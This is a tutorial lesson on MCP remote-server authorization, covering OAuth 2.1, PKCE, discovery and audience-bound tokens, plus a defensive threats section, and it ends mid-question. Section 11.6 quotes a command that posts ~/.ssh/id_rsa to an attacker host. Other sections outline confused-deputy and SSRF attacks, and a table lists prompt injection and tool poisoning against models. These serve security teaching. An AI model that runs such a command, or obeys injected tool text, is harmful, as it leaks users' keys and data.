---
title: "L11: Authorization and security"
order: 11
summary: "How a remote MCP server knows who calls it and what the caller may do: OAuth 2.1 from zero, PKCE with the hash computed, Protected Resource Metadata and authorization server discovery, Client ID Metadata Documents, resource indicators and audience checks, step-up scopes, the 2026-07-28 issuer validation, and every attack the spec names, with real 401 and 403 responses from a Python SDK server."
status: not-started
tags: [mcp, oauth, pkce, security, rfc9728, rfc8707, rfc9207, prompt-injection]
---

## 1. The question this idea answers

A local MCP server runs on your laptop as your own process. It reads your files with your rights, and nobody else can reach it. A remote MCP server is different. It listens on the internet, holds data for many users, and receives requests from many clients. It must answer two questions on every request: **who** is calling (authentication) and **what** may this caller do (authorization).

MCP does not invent its own login system for this. It reuses OAuth 2.1 and a set of IETF standards. It adds three kinds of rules on top. They say how a client discovers where to get a token. They bind each token to one server. They forbid some things that a server could do with a token. Interviewers ask "How does auth work in MCP?", "What is PKCE?", "Why is token passthrough forbidden?" and "What changed in auth recently?". This lesson answers each one down to the HTTP header.

The second half of the lesson covers the attacks. Some target OAuth: confused deputy, token theft, mix-up, SSRF during discovery. Some target the model: prompt injection through tool results, poisoned tool descriptions, servers that change after approval. The spec states it directly: MCP "cannot enforce these security principles at the protocol level". Hosts and servers must.

## 2. Mental model

> [!analogy] Hotel key cards
> You show your passport once at the front desk (the **authorization server**). The desk gives you a key card (the **access token**). The card is programmed for one hotel and a set of rooms (the **audience** and the **scopes**), and it expires. Each door lock (the **MCP server**, a resource server) reads the card. It checks two things: did our front desk make this card, and is it for this hotel? It never asks for your passport. A card for the hotel next door does not open this door, even if it is valid there. A porter who takes your card and uses it on another hotel's doors is exactly what MCP forbids (**token passthrough**).
>
> **Where it stops working:** a key card is a **bearer** token: whoever holds it can use it, and the lock cannot tell who you are. Core MCP tokens work the same way, so a stolen token works until it expires. Also, in MCP the "guest" is often a model that reads untrusted text. A valid card in the hands of a manipulated agent still opens every door that the card allows. Scopes and human approval limit that damage. OAuth alone does not.

## 3. Terms

| Term | Plain meaning |
|---|---|
| authentication | Proving who is calling. |
| authorization | Deciding what the caller may do. |
| OAuth 2.1 | A framework for giving a client limited access to a resource, with tokens instead of passwords. MCP uses the IETF draft `draft-ietf-oauth-v2-1-13`. |
| resource owner | The user who owns the data and approves access. |
| client | The application that wants access. In MCP, the MCP client inside the host. |
| authorization server (AS) | The service that authenticates the user, asks for consent and issues tokens. |
| resource server (RS) | The service that holds the data and accepts tokens. In MCP, the MCP server. |
| access token | A short-lived credential that the client sends as `Authorization: Bearer <token>`. |
| refresh token | A longer-lived credential that buys a new access token without the user. |
| scope | A named permission inside a token, for example `files:read`. |
| authorization code | A one-time code that the AS gives the client through the browser. The client trades it for tokens. |
| PKCE | Proof Key for Code Exchange (RFC 7636). The client proves at the token step that it started the flow. |
| redirect URI | The address where the AS sends the browser back with the code. |
| Protected Resource Metadata (PRM) | A JSON document (RFC 9728) in which a resource server names its authorization servers. |
| issuer | The identifier URL of an authorization server. The `iss` value. |
| audience | The resource for which a token was issued. The `aud` claim in a JWT. |
| resource indicator | The `resource` parameter (RFC 8707) that tells the AS which server the token is for. |
| Client ID Metadata Document (CIMD) | A JSON document at an HTTPS URL. The URL itself is the client's `client_id`. |
| token passthrough | Accepting a token that was issued for another service, and forwarding it. Forbidden in MCP. |
| confused deputy | A trusted service that an attacker tricks into using its own authority for the attacker. |

All terms are also in the [Glossary](/notes/ai/llm-systems/glossary).

## 4. When authorization applies

The spec makes authorization **optional**, with three rules (2026-07-28, Authorization, Protocol Requirements):

1. Implementations that use an HTTP-based transport SHOULD conform to the MCP authorization specification.
2. Implementations that use stdio SHOULD NOT follow it. They retrieve credentials from the environment instead.
3. Implementations on other transports MUST follow the security practices of their own protocol.

Why the stdio exception? Interpretation of these notes: a stdio server is a child process of the host, under the same user account. The host can pass a credential in the environment when it starts the process. There is no network endpoint for anyone else to call. The [Local Server Security](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/local-server-security) guide adds the consequence: "the client and a stdio server share one trust domain." The SDKs do not defend one against the other.

```json
{
  "mcpServers": {
    "orders": {
      "command": "uv",
      "args": ["run", "orders_server.py"],
      "env": {"ORDERS_API_TOKEN": "a-narrow-token-for-this-server-only"}
    }
  }
}
```

That guide's advice on such secrets: pass them per server, not globally in a shell profile. Give each server its own narrowly scoped token. Prefer the operating system's secret store over plain-text configuration files.

## 5. OAuth 2.1 from zero

### 5.1 The problem OAuth solves

Before OAuth, an application that needed your data in another service asked for your password. It then had all your rights, forever, and you could not take back access without changing the password. OAuth replaces the password with a **token**: limited in scope, limited in time, bound to one service, and revocable.

### 5.2 The four roles in MCP

| OAuth role | In MCP | Example |
|---|---|---|
| resource owner | The user | You |
| client | The MCP client in the host | Claude Desktop's connection to an orders server |
| authorization server | A separate service, or hosted together with the MCP server | The company identity provider, for example Okta |
| resource server | The MCP server | `https://mcp.example.com/mcp` |

Since 2025-06-18, the spec classifies the MCP server as an OAuth **resource server**. It names its authorization server in Protected Resource Metadata. The AS "may be hosted with the resource server or a separate entity". In 2025-03-26, the spec's main example made the MCP server the authorization server too, at fixed default paths. [L12](/notes/ai/llm-systems/07-mcp/l12-whats-new-version-history) covers that history.

### 5.3 The authorization code flow, step by step

![Alt text: fourteen steps between client, browser, MCP server and authorization server, from the first 401 to the first bearer call.](/notes/media/llm-systems/figures/07-11-oauth-discovery-flow.svg)

1. The client sends an MCP request without a token. The server answers `401 Unauthorized` with a `WWW-Authenticate` header that names its metadata document.
2. The client fetches the Protected Resource Metadata. It learns the authorization server.
3. The client fetches the authorization server metadata. It learns the endpoints and checks that PKCE is supported.
4. The client gets a `client_id` (section 8), makes a PKCE pair, a random `state`, and records the expected issuer.
5. The client opens the browser at the authorization endpoint with all parameters.
6. The user authenticates and approves. The AS redirects the browser to the client's redirect URI with `code`, `state` and `iss`.
7. The client checks `state` and `iss`, then posts the code and the PKCE verifier to the token endpoint.
8. The AS returns an access token for this one MCP server, and maybe a refresh token.
9. The client sends every MCP request with `Authorization: Bearer <token>`.

The authorization request (step 5) is a URL. An illustration with example values, one parameter per line for reading:

```http
GET /authorize?response_type=code
  &client_id=https%3A%2F%2Fapp.example.com%2Foauth%2Fclient-metadata.json
  &redirect_uri=http%3A%2F%2F127.0.0.1%3A3000%2Fcallback
  &code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM
  &code_challenge_method=S256
  &scope=orders%3Aread
  &state=af0ifjsldkj
  &resource=https%3A%2F%2Fmcp.example.com%2Fmcp HTTP/1.1
Host: auth.example.com
```

The token request (step 7), again with example values:

```http
POST /token HTTP/1.1
Host: auth.example.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=SplxlOBeZQQYbYS6WxSbIA&redirect_uri=http%3A%2F%2F127.0.0.1%3A3000%2Fcallback&client_id=https%3A%2F%2Fapp.example.com%2Foauth%2Fclient-metadata.json&code_verifier=dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk&resource=https%3A%2F%2Fmcp.example.com%2Fmcp
```

A typical token response has `access_token`, `token_type` (`Bearer`), `expires_in` in seconds, optionally `refresh_token`, and the granted `scope`:

```json
{
  "access_token": "eyJhbGciOiJSUzI1NiIs...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "tGzv3JOkF0XG5Qx2TlKWIA",
  "scope": "orders:read"
}
```

## 6. PKCE: the hash that protects the code

### 6.1 The attack PKCE stops

The authorization code travels through the browser and the redirect URI. Another app on the same machine can sometimes catch it, for example by listening on the same localhost port. If the code alone were enough to get a token, the thief would win. PKCE makes the code useless without a secret that never left the client.

### 6.2 The math

The client makes a random **code verifier**: 43 to 128 characters from `A-Z`, `a-z`, `0-9`, `-`, `.`, `_`, `~` (RFC 7636 section 4.1). It sends only a hash of it, the **code challenge**, in the authorization request:

$$
\text{code\_challenge} = \operatorname{BASE64URL}\big(\operatorname{SHA256}(\operatorname{ASCII}(\text{code\_verifier}))\big)
$$

The symbols mean:

- $\operatorname{ASCII}(\cdot)$ turns the text into bytes, one byte per character.
- $\operatorname{SHA256}$ is the SHA-256 hash function. It maps any input to 32 bytes, and nobody can find an input for a given output.
- $\operatorname{BASE64URL}$ is Base64 with the URL-safe alphabet (`-` and `_` instead of `+` and `/`) and without `=` padding.

At the token request, the client sends the verifier itself. The AS hashes it and compares the result with the stored challenge.

![Alt text: the RFC 7636 test vector from random bytes to verifier, SHA-256 hash and challenge, with the token check.](/notes/media/llm-systems/figures/07-11-pkce.svg)

> [!example] Worked example: the RFC 7636 test vector, computed
> 1. 32 random bytes, from Appendix B of RFC 7636: `116, 24, 223, 180, ...`.
> 2. Base64url without padding gives the verifier `dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk`. 32 bytes are 256 bits. Base64 writes 6 bits per character, so $\lceil 256 / 6 \rceil = 43$ characters.
> 3. SHA-256 of the 43 ASCII bytes gives 32 bytes. In hex: `13d31e961a1ad8ec2f16b10c4c982e0876a878ad6df144566ee1894acb70f9c3`.
> 4. Base64url of those 32 bytes is 44 characters with one `=` at the end. Without the padding: `E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM`, 43 characters.
>
> This matches the challenge printed in RFC 7636. The code of Exercise 1 reproduces it, and its real output is `E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM True`.

How strong is the verifier? 32 random bytes give $2^{256}$ possible values. Guessing one is not feasible. A thief who has only the challenge cannot reverse SHA-256 to get the verifier.

### 6.3 The MCP rules for PKCE

| Rule (2026-07-28, Authorization Security Considerations) | Strength |
|---|---|
| Clients implement PKCE and verify PKCE support before they start | MUST |
| Clients use `S256` when technically capable (not `plain`, where challenge = verifier) | MUST |
| If the AS metadata has no `code_challenge_methods_supported`, the AS does not support PKCE, and the client refuses to proceed | MUST |
| OpenID Connect providers include `code_challenge_methods_supported` in their metadata | MUST |

## 7. Discovery: from one 401 to the right authorization server

```video
{"src": "/notes/media/llm-systems/manim/m36-oauth-discovery-flow.mp4", "caption": "From the first 401 to a bearer call: Protected Resource Metadata, authorization server metadata, PKCE, the iss check and the audience-bound token."}
```

### 7.1 The 401 and the Protected Resource Metadata

A real server can show this. The orders server of [L13](/notes/ai/llm-systems/07-mcp/l13-build-an-mcp-server) ran as a resource server with Python SDK 2.3.0, `AuthSettings` and a toy token verifier. It answered a request without a token like this (measured in these notes). In all real responses on this page, the `date`, `server` and `content-length` headers are omitted.

```http
HTTP/1.1 401 Unauthorized
content-type: application/json
www-authenticate: Bearer error="invalid_token", error_description="Authentication required", resource_metadata="http://127.0.0.1:8810/.well-known/oauth-protected-resource/mcp"

{"error": "invalid_token", "error_description": "Authentication required"}
```

The client follows `resource_metadata`. The real document:

```json
{"resource":"http://127.0.0.1:8810/mcp","authorization_servers":["https://auth.example.com"],"scopes_supported":["orders:read"],"bearer_methods_supported":["header"]}
```

The fields are defined in RFC 9728. `resource` is REQUIRED and is the server's identifier. `authorization_servers` lists the issuers that can mint tokens for it. `scopes_supported` is RECOMMENDED. `bearer_methods_supported` says how to send the token. MCP adds one rule: the document MUST contain `authorization_servers` with at least one entry. RFC 9728 section 3.3 adds another: the `resource` value MUST be identical to the URL that the client used. If it differs, the client MUST NOT use the data.

### 7.2 The discovery rules

| Who | Rule (2026-07-28) |
|---|---|
| MCP server | MUST implement RFC 9728. MUST offer the PRM URL either in `WWW-Authenticate` (`resource_metadata`) or at a well-known URI. |
| MCP client | MUST support both. Uses the header when present. Otherwise tries the well-known URIs in order: first with the endpoint path, then at the root. |
| MCP client | MUST support both AS metadata formats: RFC 8414 and OpenID Connect Discovery 1.0. |
| Authorization server | MUST provide at least one of the two formats. |
| MCP client | MUST validate the AS metadata: its `issuer` MUST be identical to the issuer used to build the URL. |

> [!example] Worked example: every URL the client may try
> The MCP server is `https://example.com/public/mcp`. Its PRM names the issuer `https://auth.example.com/tenant1`. The function of Exercise 2 prints the candidates in priority order (real output):
>
> ```text
> https://example.com/.well-known/oauth-protected-resource/public/mcp
> https://example.com/.well-known/oauth-protected-resource
> https://auth.example.com/.well-known/oauth-authorization-server/tenant1
> https://auth.example.com/.well-known/openid-configuration/tenant1
> https://auth.example.com/tenant1/.well-known/openid-configuration
> ```
>
> Lines 1 and 2 are the PRM candidates. Lines 3 to 5 are the AS metadata candidates. RFC 8414 inserts the well-known suffix between the host and the path. Line 5 follows the OpenID Connect Discovery convention, which appends the suffix after the path (RFC 8414 section 5 discusses both). For an issuer without a path, only two URLs remain: `/.well-known/oauth-authorization-server`, then `/.well-known/openid-configuration`.

Why the strict `issuer` check? The spec gives the attack: a document fetched from `https://attacker.example/.well-known/oauth-authorization-server` that claims `"issuer": "https://honest.example"` MUST be rejected. Otherwise an attacker could pose as an honest provider.

### 7.3 Scope selection

The server SHOULD include a `scope` parameter in the 401 challenge. The client then picks scopes in this order:

1. The `scope` of the `WWW-Authenticate` challenge, if present.
2. Otherwise all scopes in `scopes_supported` of the PRM. If that field is missing too, the client omits the `scope` parameter.

The client MUST treat the challenged scopes as authoritative for the current operation. It MUST NOT assume any set relationship between the challenge and `scopes_supported`.

## 8. Client registration: how the client gets a `client_id`

An AS only issues tokens to clients it knows. But an MCP client often meets a server for the first time. The spec offers three mechanisms, in this priority order for clients that support all of them:

1. **Pre-registration.** Use client information that the client already has for this AS.
2. **Client ID Metadata Documents (CIMD).** Use them if the AS metadata has `"client_id_metadata_document_supported": true`.
3. **Dynamic Client Registration (DCR, RFC 7591).** Use it as a fallback if the AS has a `registration_endpoint`. Deprecated in 2026-07-28.
4. Otherwise, ask the user to enter client information.

### 8.1 Client ID Metadata Documents

With CIMD, the `client_id` is an HTTPS URL. The URL serves a JSON document about the client. The AS fetches it when it sees a URL-shaped `client_id`. The spec's example document:

```json
{
  "client_id": "https://app.example.com/oauth/client-metadata.json",
  "client_name": "Example MCP Client",
  "client_uri": "https://app.example.com",
  "logo_uri": "https://app.example.com/logo.png",
  "redirect_uris": [
    "http://127.0.0.1:3000/callback",
    "http://localhost:3000/callback"
  ],
  "grant_types": ["authorization_code"],
  "response_types": ["code"],
  "token_endpoint_auth_method": "none"
}
```

The rules: the URL MUST use `https` and contain a path. The document MUST include `client_id`, `client_name` and `redirect_uris`. Its `client_id` MUST equal the document URL exactly. The AS MUST validate that equality. It MUST validate the redirect URI of each request against the document. It SHOULD cache the document according to HTTP cache headers.

Why CIMD wins over DCR: no registration call, no stored registration per server, and the client keeps one identity across all authorization servers. The spec notes that CIMD client IDs "are portable across authorization servers". The AS also sees a domain that it can apply a trust policy to, for example an allowlist.

### 8.2 Dynamic Client Registration (deprecated)

With DCR, the client POSTs its metadata to the AS `registration_endpoint` and receives a fresh `client_id`. It is deprecated in 2026-07-28 (PR #2858) and kept for authorization servers that do not support CIMD. Two 2026 rules still apply to it:

- **`application_type` (SEP-837).** The client MUST send an appropriate value. Desktop apps, CLI tools and localhost web apps SHOULD use `"native"`. Remote browser apps SHOULD use `"web"`. Without it, OpenID Connect assumes `"web"`, which can reject a `http://127.0.0.1` redirect URI.
- **Issuer binding (SEP-2352).** Persisted client credentials MUST be keyed by the AS `issuer`. They MUST NOT be reused with another AS. When the PRM names a new AS, the client MUST register again.

## 9. The token: audience, scope and step-up

### 9.1 Resource indicators bind a token to one server

The client MUST send the `resource` parameter (RFC 8707) in both the authorization request and the token request. It MUST send it even if the AS does not support it. Its value is the **canonical URI** of the MCP server: absolute, with a scheme, without a fragment.

| URI | Valid? |
|---|---|
| `https://mcp.example.com/mcp` | yes |
| `https://mcp.example.com` | yes |
| `https://mcp.example.com:8443` | yes |
| `https://mcp.example.com/server/mcp` | yes, when the path names one server among several |
| `mcp.example.com` | no: missing scheme |
| `https://mcp.example.com#fragment` | no: contains a fragment |

The spec prefers the form without a trailing slash. Percent-encoded in a query string, `https://mcp.example.com/mcp` becomes `https%3A%2F%2Fmcp.example.com%2Fmcp` (computed with Python's `urllib.parse.quote`).

The server side is the other half. MCP servers MUST validate that a token was issued specifically for them as the audience. Invalid or expired tokens MUST receive HTTP 401. The SDK server above has `validate_token_resource=True`. A token whose resource is `https://other.example.com/mcp` received exactly the same 401 as a missing token (measured in these notes).

### 9.2 Using the token

- The client MUST send `Authorization: Bearer <access-token>` on **every** HTTP request.
- Tokens MUST NOT appear in the URI query string. The SDK server rejected `?access_token=good-token` with 401 (measured).
- The client MUST NOT send the server any token except one issued by the server's own AS.

### 9.3 Not enough scope: 403 and step-up

A token can be valid but too weak for one operation. The server SHOULD answer `403 Forbidden` with `error="insufficient_scope"` and the scopes it needs. The spec's example:

```http
HTTP/1.1 403 Forbidden
WWW-Authenticate: Bearer error="insufficient_scope",
                         scope="files:write",
                         resource_metadata="https://mcp.example.com/.well-known/oauth-protected-resource",
                         error_description="File write permission required for this operation"
```

The real SDK 2.3.0 server answered a token without `orders:read` like this (measured):

```http
HTTP/1.1 403 Forbidden
www-authenticate: Bearer error="insufficient_scope", error_description="Required scope: orders:read", resource_metadata="http://127.0.0.1:8810/.well-known/oauth-protected-resource/mcp"
```

Measured in these notes: this SDK version names the scope only in `error_description`, not in a `scope` parameter. The spec says the server SHOULD send `scope`. A client that reads only the `scope` parameter must then use the scope selection order of section 7.3.

The **step-up** flow has three steps. The client computes the union of its earlier scopes and the challenged scopes. It runs the authorization flow again with that set. Then it retries the original request, a limited number of times. The union keeps old permissions. If the client asked only for `files:write`, the new token would lose `files:read`.

> [!example] Worked example: the step-up scope set
> The client holds a token for `files:read`. A write tool returns the 403 above with `scope="files:write"`. Union: $\{\texttt{files:read}\} \cup \{\texttt{files:write}\}$. The new authorization request carries `scope=files:read files:write`. Exercise 4 computes it, real output: `files:read files:write`.

Servers SHOULD put all scopes that the current operation needs into one challenge. Servers MUST account for scope hierarchies, where a broad scope implies narrower ones. Servers SHOULD NOT list `offline_access` in their scopes, because refresh tokens are not a resource requirement.

### 9.4 Refresh tokens and token theft

A client that wants refresh tokens MUST keep them confidential, SHOULD list `refresh_token` in its `grant_types`, and MUST NOT assume it will get one. The AS SHOULD issue short-lived access tokens. A public client has no client secret, for example a desktop app. For public clients, the AS MUST rotate refresh tokens: each use returns a new refresh token, and the old one stops working.

## 10. What changed in 2026-07-28

| Change | Rule | Source |
|---|---|---|
| Issuer in the authorization response | AS SHOULD include `iss` (RFC 9207). Clients MUST validate a present `iss` against the recorded issuer before they redeem the code. | SEP-2468 |
| `application_type` in DCR | Clients MUST send an appropriate value | SEP-837 |
| Credentials bound to the issuer | Key persisted credentials by `issuer`. Never reuse them with another AS. Register again when the AS changes. | SEP-2352 |
| DCR deprecated | Use Client ID Metadata Documents. DCR stays for older authorization servers. | PR #2858 |

### 10.1 The mix-up attack and `iss`

A client talks to many authorization servers. An attacker controls one of them. In a **mix-up attack**, the attacker makes the client send it a code that an honest AS issued. RFC 9207 stops this. The AS puts its issuer in the redirect, for example `&iss=https%3A%2F%2Fhonest.as.example`. The client compares it with the issuer that it recorded before it opened the browser.

| AS metadata `authorization_response_iss_parameter_supported` | `iss` in response | Client action |
|---|---|---|
| `true` | present | Compare with the recorded issuer by simple string comparison |
| `true` | absent | Reject the response |
| `false` or absent | present | Compare with the recorded issuer |
| `false` or absent | absent | Proceed |

The client MUST NOT normalize `iss` before the comparison: no case folding, no removal of a default port or a trailing slash. On mismatch it MUST NOT act on, or even display, the `error` fields of the response. The spec notes that PKCE alone does not stop mix-up, because the client would send the verifier to the attacker's token endpoint too. The spec expects a future revision to make `iss` a MUST for authorization servers.

## 11. Threats and defenses

![Alt text: the correct design with token A for the MCP server and token B for the upstream API, above the forbidden token passthrough.](/notes/media/llm-systems/figures/07-11-token-audience.svg)

### 11.1 Token passthrough

**Attack.** A server accepts a token that was not issued for it and forwards it to a downstream API. The Security Best Practices page lists the damage. Rate limits and audits keyed on the audience are bypassed. The server cannot tell clients apart. Downstream logs show the wrong identity. A stolen token can turn the server into a proxy for exfiltration.

**Defense.** "MCP servers MUST NOT accept any tokens that were not explicitly issued for the MCP server." When the server calls an upstream API, it acts as a separate OAuth client and uses its own token from the upstream AS. It MUST NOT pass through the token it received.

### 11.2 Confused deputy

**Setting.** An MCP proxy server fronts a third-party API. It uses one **static client ID** with the third-party AS. It lets MCP clients register dynamically. The third-party AS sets a **consent cookie** after the first approval. The proxy does no consent of its own.

**Attack.**

1. The user once connected normally. The third-party AS stored a consent cookie for the proxy's static client ID.
2. The attacker registers a new client at the proxy with redirect URI `attacker.com`.
3. The attacker sends the user a crafted authorization link.
4. The third-party AS sees the cookie and skips the consent screen.
5. The proxy sends its MCP authorization code to the attacker's redirect URI.
6. The attacker trades the code for a token and acts as the user.

**Defense.** MCP proxy servers MUST implement per-client consent before they forward to the third-party AS. They keep a registry of approved `client_id` values per user. They show their own consent page with the client name, the scopes and the redirect URI, with CSRF protection and no framing. They match redirect URIs exactly. They set the `state` cookie only **after** the user approves. State values are single-use and short-lived, for example 10 minutes.

### 11.3 Session hijacking (2025-11-25) and state handle hijacking (2026-07-28)

In 2025-11-25, a Streamable HTTP server could issue an `Mcp-Session-Id`. The old best-practices page described two attacks on it. **Impersonation:** the attacker guesses or steals the session ID and calls the server, and the server treats the session ID as proof of identity. **Prompt injection through a shared queue:** with several stateful servers, the attacker sends an event keyed by the victim's session ID to server B. Server A polls the queue and delivers the malicious payload to the victim's client. The mitigations: servers MUST verify all inbound requests. They MUST NOT use sessions for authentication. They MUST use secure random session IDs. They SHOULD key stored data as `<user_id>:<session_id>`, with the user ID taken from the token.

Revision 2026-07-28 has no sessions. Servers that need state mint explicit **state handles**, such as a basket ID, and receive them as tool arguments. The same attack becomes **state handle hijacking**. The defense is the same: "MCP servers MUST NOT treat possession of a state handle as authentication." Handles SHOULD be secure random values. They SHOULD be bound server-side to the authenticated user, for example as `<user_id>:<handle>`.

### 11.4 SSRF during discovery

**Attack.** OAuth discovery makes the client fetch URLs that a malicious server controls: `resource_metadata`, `authorization_servers`, and the endpoints in the AS metadata. The server can name `http://169.254.169.254/` (the cloud metadata service), `http://localhost:6379/` or a domain whose DNS changes between check and use. A client that runs inside a cloud network then leaks credentials or probes internal services. The same risk hits an AS that fetches CIMD URLs from unknown clients.

**Defense.** Clients deployed on a server MUST consider SSRF. They SHOULD require HTTPS except for loopback in development. They SHOULD block private and reserved ranges: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`, `169.254.0.0/16`, `fc00::/7` and `fe80::/10`. They SHOULD validate every redirect hop and use an egress proxy. The spec warns against hand-written IP parsing, because attackers use octal, hex and IPv4-mapped IPv6 forms. Exercise 3 shows why: `https://[::ffff:10.0.0.1]/token` is the private address `10.0.0.1`.

### 11.5 Malicious authorization URLs

A malicious server can hand the client an "authorization URL" such as `javascript:...` or a string with shell metacharacters. Clients MUST allow only `https`, plus `http` for loopback in development. They MUST reject `javascript:`, `data:`, `file:` and `vbscript:`. They MUST NOT open URLs through a shell such as `cmd.exe` or PowerShell.

### 11.6 Local server compromise

A one-click install can run any command with the user's rights, for example `npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location` (the best-practices page's own example). If a client offers one-click configuration, it MUST show the exact command without truncation, mark it as dangerous, require explicit approval and allow cancellation. It SHOULD sandbox the server with minimal privileges. Servers meant for local use SHOULD prefer stdio, or require a token if they listen on HTTP.

### 11.7 Attacks through the model

These attacks do not break OAuth. They use the fact that the model reads text and the host acts on the model's tool calls. Lesson [L9 of context engineering](/notes/ai/context-engineering/06-tools-and-mcp/l9-tool-security-and-prompt-injection) covers prompt injection in depth.

| Attack | How it works | Defense |
|---|---|---|
| Indirect prompt injection | A tool result (a web page, an email, a ticket) contains instructions. The model follows them with the user's tokens. | Least privilege per tool. Human approval for destructive and outbound actions. No agent that combines private data, untrusted content and external communication without a gate. |
| Tool poisoning | A server hides instructions in a tool name or description. The model reads them even if it never calls that tool. | Read tool descriptions before trusting a server. Keep few servers. The Local Server Security guide covers this threat. |
| Tool shadowing | A poisoned description steers how the model uses another server's tools. The guide notes that every configured server shares one model context. | Isolate high-value servers. Prefix tool names by server. |
| Rug pull | A server changes its tool definitions after the user approved it. The guide says "a one-time consent dialog and package pinning do not cover this surface". | Prefer clients that pin tool definitions and ask again when they change. |
| Lying annotations | A server marks a destructive tool `readOnlyHint: true`. | "Clients MUST consider tool annotations to be untrusted unless they come from trusted servers." Keep your own policy tags. |

The tools page also says that there SHOULD always be a human in the loop with the ability to deny tool invocations. Servers MUST validate all tool inputs, implement access controls, rate-limit invocations and sanitize outputs.

### 11.8 Scope minimization

A token with omnibus scopes (`files:*`, `admin:*`) turns one leak into full access. The best-practices page recommends a minimal initial set, for example `mcp:tools-basic`, and elevation by targeted `scope` challenges when a privileged tool is first used. Its list of common mistakes: all scopes in `scopes_supported`, wildcard scopes, bundled unrelated privileges, and the whole catalog in every challenge.

## 12. Authorization extensions

Two official extensions live in the `ext-auth` repository:

| Extension | Identifier | Use |
|---|---|---|
| OAuth Client Credentials | `io.modelcontextprotocol/oauth-client-credentials` | Machine-to-machine access with no user: CI jobs, background services. Client secret or a signed JWT assertion (RFC 7523, recommended). From SEP-1046. |
| Enterprise-Managed Authorization | `io.modelcontextprotocol/enterprise-managed-authorization` | The company identity provider decides which servers each employee may use. The client trades the user's SSO identity for an Identity Assertion JWT Authorization Grant (ID-JAG), then trades that for an MCP access token. No per-server consent screen. From SEP-990. The MCP blog announced it as stable on 2026-06-18. |

## 13. Production notes

| Concern | What to do |
|---|---|
| Server role | Act as a resource server. Prefer a standard AS. Publish PRM. |
| Token validation | Check signature, expiry, issuer and audience on every request. Reject query-string tokens. |
| Upstream calls | Get your own token for each upstream API. Never forward the client's token. |
| Scopes | Small initial set. One complete challenge per operation. |
| Client side | PKCE with S256. Record the issuer. Validate `iss` and `state`. Prefer CIMD. Key credentials by issuer. |
| SSRF | Validate every discovery URL and redirect hop. Block private ranges. Use an egress proxy in clouds. |
| State | Random handles bound to the token's user. Never accept a handle as identity. |
| Model-facing risks | Annotations are hints. Approval gates for destructive tools. Few, reviewed servers. |

### Exercises

These go in the notebook folder `llm-systems/` of `C:\Users\ASohi\Downloads\AI\agent-harness-lab`.

1. **PKCE.** Write `make_verifier()`, `challenge_s256(verifier)` and `server_check(stored_challenge, verifier)`. Acceptance test: the RFC 7636 vector gives `E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM`, a fresh verifier and its challenge both have 43 characters, and a wrong verifier fails the check. Hint 1: `base64.urlsafe_b64encode(...).rstrip(b"=")`. Hint 2: compare with `secrets.compare_digest`.
2. **Discovery URLs.** Write `prm_candidates(mcp_url)` and `as_metadata_candidates(issuer)`. Acceptance test: the five URLs of the worked example in section 7.2, in that order, and two URLs for an issuer without a path. Hint 1: `urllib.parse.urlsplit`. Hint 2: RFC 8414 puts the suffix between host and path.
3. **An SSRF guard for discovery URLs.** Write `check_oauth_url(url, allow_loopback_http=False)`. Acceptance test: it refuses `javascript:` URLs, plain `http` outside loopback, `169.254.169.254`, `192.168.1.1` and the IPv4-mapped `::ffff:10.0.0.1`, and accepts a public HTTPS host name. Hint 1: the `ipaddress` module has `is_private`, `is_link_local` and `ipv4_mapped`. Hint 2: a host name still needs a check of each resolved address at connect time.
4. **Step-up scopes.** Parse a `WWW-Authenticate` challenge and return the scope string for re-authorization. Acceptance test: previous `{"files:read"}` plus the challenge of section 9.3 gives `files:read files:write`. Hint 1: split the parameters on commas, then on the first `=`. Hint 2: a set union keeps old scopes.

## 14. Common mistakes

1. **"The MCP server checks that the token is valid, so it is safe."** It must also check that the token was issued **for this server** (audience). A valid token for another service must get 401.
2. **"The server can forward the user's token to the upstream API."** That is token passthrough, which MCP forbids. The server needs its own upstream token.
3. **"PKCE is for public clients only, so a desktop app can skip it."** MCP clients MUST use PKCE with S256, and MUST refuse an AS that does not advertise `code_challenge_methods_supported`.
4. **"stdio servers need OAuth too."** The spec says stdio implementations SHOULD NOT use this flow. They get credentials from the environment.
5. **"Dynamic Client Registration is the way to register."** It is deprecated in 2026-07-28. Client ID Metadata Documents are preferred.
6. **"A session ID or a state handle identifies the user."** Neither is authentication. Verify the token on every request and bind state to the token's user.
7. **"`readOnlyHint: true` means the tool is safe."** Annotations are untrusted unless the server is trusted.
8. **"Discovery URLs from the server can be fetched blindly."** They are an SSRF channel. Validate scheme and address, and every redirect.

## 15. One-minute explanation

MCP authorization applies to HTTP servers. stdio servers take credentials from the environment. It reuses OAuth 2.1: the MCP server is a resource server, and an authorization server issues the tokens. A client without a token gets a 401 whose `WWW-Authenticate` header names the server's Protected Resource Metadata, RFC 9728. That document names the authorization server, whose RFC 8414 or OpenID metadata gives the endpoints. The client identifies itself, preferably with a Client ID Metadata Document, and runs the authorization code flow with PKCE S256. It sends the `resource` parameter, so the token's audience is exactly this MCP server. The server must check that audience and must never pass the token through to other APIs. Scopes start small and grow by 403 `insufficient_scope` challenges. In 2026-07-28, clients must validate the `iss` parameter against the recorded issuer, credentials are bound to their issuer, and Dynamic Client Registration is deprecated. Beyond OAuth, hosts must treat tool results, descriptions and annotations as untrusted, and keep a human in the loop for dangerous tools.

## 16. Check questions

```check
{
  "question": "Walk through what an MCP client does after it receives `401 Unauthorized` from a remote MCP server, up to its first successful call. Name each document and each parameter.",
  "hint": "Two metadata documents, one registration, one browser trip, one token request.",
